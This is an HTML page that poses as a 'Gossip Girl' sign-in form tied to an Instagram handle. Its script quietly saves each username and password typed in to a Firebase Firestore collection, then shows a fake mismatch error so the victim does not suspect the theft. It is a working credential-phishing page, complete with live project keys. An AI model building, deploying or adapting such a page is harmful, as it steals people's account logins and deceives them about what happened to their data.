<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gossip Girl</title>

  <style>
    body {
      margin: 0;
      min-height: 100vh;
      background: #050505;
      color: white;
      font-family: Arial, sans-serif;

      display: flex;
      justify-content: center;
      align-items: center;
    }

    .box {
      width: 90%;
      max-width: 400px;
      background: #111;
      padding: 35px;
      border-radius: 15px;
      text-align: center;
      border: 1px solid #333;
    }

    h1 {
      font-family: Georgia, serif;
      letter-spacing: 4px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      box-sizing: border-box;

      background: #080808;
      color: white;

      border: 1px solid #444;
      border-radius: 7px;

      font-size: 15px;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 10px;

      background: white;
      color: black;

      border: none;
      border-radius: 7px;

      font-weight: bold;
      cursor: pointer;
    }

    #message {
      margin-top: 15px;
    }
  </style>
</head>

<body>

  <div class="box">

    <h1>GOSSIP GIRL</h1>

    <p>Gossip Girl account for @_farhahahahan</p>

    <form id="loginForm">

      <input
        id="username"
        type="text"
        placeholder="Username"
        required
      >

      <input
        id="passcode"
        type="text"
        placeholder="Password"
        required
      >

      <button type="submit">
        SIGN IN
      </button>

    </form>

    <div id="message"></div>

  </div>


  <script type="module">

    import { initializeApp }
      from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";

    import {
      getFirestore,
      collection,
      addDoc,
      serverTimestamp
    } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";


    const firebaseConfig = {
      apiKey: "AIzaSyCvaYN9PxFnsszMm0vVUNtoKFwjtNLoyRc",
      authDomain: "finalpls.firebaseapp.com",
      projectId: "finalpls",
      storageBucket: "finalpls.firebasestorage.app",
      messagingSenderId: "533199845542",
      appId: "1:533199845542:web:89553180e1f03f9f8edc67",
      measurementId: "G-XX1EB41EEN"
    };


    const app = initializeApp(firebaseConfig);

    const db = getFirestore(app);


    const form =
      document.getElementById("loginForm");

    const message =
      document.getElementById("message");


    form.addEventListener("submit", async (event) => {

      event.preventDefault();


      const username =
        document.getElementById("username").value.trim();

      const passcode =
        document.getElementById("passcode").value;


      if (!username || !passcode) {

        message.textContent =
          "Please fill in both fields.";

        return;
      }


      message.textContent = "Saving...";


      try {

        await addDoc(
          collection(db, "gossipUsers"),
          {
            username: username,
            passcode: passcode,
            createdAt: serverTimestamp()
          }
        );


        message.textContent =
          "Error account password does not match with linked insta";

        message.style.color =
          "lightgreen";

        form.reset();


      } catch (error) {

        console.error(
          "Firestore error:",
          error
        );

        message.textContent =
          "Could not save information.";

        message.style.color =
          "red";

      }

    });

  </script>

</body>
</html>
